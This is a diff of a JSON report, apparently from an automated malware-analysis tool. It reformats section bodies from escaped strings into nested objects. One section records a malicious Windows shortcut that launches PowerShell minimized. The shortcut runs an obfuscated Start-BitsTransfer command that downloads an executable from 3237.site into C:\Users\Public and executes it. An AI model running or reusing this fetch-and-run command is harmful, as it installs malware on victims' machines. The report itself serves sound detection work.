@@ -5,7 +5,25 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [2.607629527057367, 2.3046959684677426, 2.8917478433647865, 3.7677323404301664, 1.2426604202879628, 1.12701655065387, 0.0, 2.2932893956950466]}}",
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              2.607629527057367,
+              2.3046959684677426,
+              2.8917478433647865,
+              3.7677323404301664,
+              1.2426604202879628,
+              1.12701655065387,
+              0.0,
+              2.2932893956950466
+            ]
+          },
+          "type": "colormap"
+        },
         "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
@@ -18,7 +36,16 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"IDList, CommandArgs, IconFile, Unicode, ExpIcon\", \"file_attributes\": \"(none)\", \"icon_index\": 3, \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"powershell.exe\", \"command_line_arguments\": \"Start-BitsTransfer -Sou htt`p://3237.site/test01.e`xe -Dest C:\\\\Users\\\\Public\\\\o5impa.e`xe;C:\\\\Users\\\\Public\\\\o5impa.e`xe\", \"icon_file_name\": \"C:\\\\Windows\\\\System32\\\\shell32.dll\"}",
+        "body": {
+          "command_line_arguments": "Start-BitsTransfer -Sou htt`p://3237.site/test01.e`xe -Dest C:\\Users\\Public\\o5impa.e`xe;C:\\Users\\Public\\o5impa.e`xe",
+          "file_attributes": "(none)",
+          "flags": "IDList, CommandArgs, IconFile, Unicode, ExpIcon",
+          "hot_key": "(none)",
+          "icon_file_name": "C:\\Windows\\System32\\shell32.dll",
+          "icon_index": 3,
+          "run_window": "Show Minimized No Activate",
+          "target_file_dosname": "powershell.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -60,7 +87,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"icon_location\": \"C:\\\\Windows\\\\System32\\\\shell32.dll\"}",
+        "body": {
+          "icon_location": "C:\\Windows\\System32\\shell32.dll"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -80,7 +109,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"target_file_dosname\": \"Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}",
+        "body": {
+          "target_file_dosname": "Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
